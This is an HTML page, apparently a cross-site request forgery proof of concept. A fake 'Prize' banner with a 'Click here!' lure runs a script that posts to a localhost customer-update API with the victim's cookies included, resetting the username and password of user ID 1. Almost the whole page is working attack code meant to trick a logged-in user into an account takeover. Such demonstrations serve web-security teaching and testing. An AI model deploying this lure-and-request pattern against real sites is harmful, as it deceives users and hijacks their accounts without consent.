<!DOCTYPE html>
<html>
<head>
    <title>Prize</title>
</head>

<body>

<div onclick="exploit()" style="cursor:pointer;text-align:center;">
    <img src="youwin.png"/>
    <h1>Click here!</h1>
</div>

<script>
  const exploit = async () => {
    // Scripted CSRF Request
    // Based on the functionality of the website, this is the update endpoint
    const updateURL = 'http://localhost:8080/api/customer/update-customer'
    const formData = new FormData()

    // We want to modify the user with ID 1
    formData.append("id", 1)

    // Set any kind of arbitrary username and password
    formData.append("username", "milos")
    formData.append("password", "zivkovic")

    try {
      await fetch(updateURL, {
        method: "POST",
        body: formData,
        credentials: 'include' // Required for browser CORS
      })

      console.log("Username and password successfully set!")
    } catch (e) {
      console.log("Unable to perform exploit")
      console.error(e)
    }
  }
</script>
</body>
</html>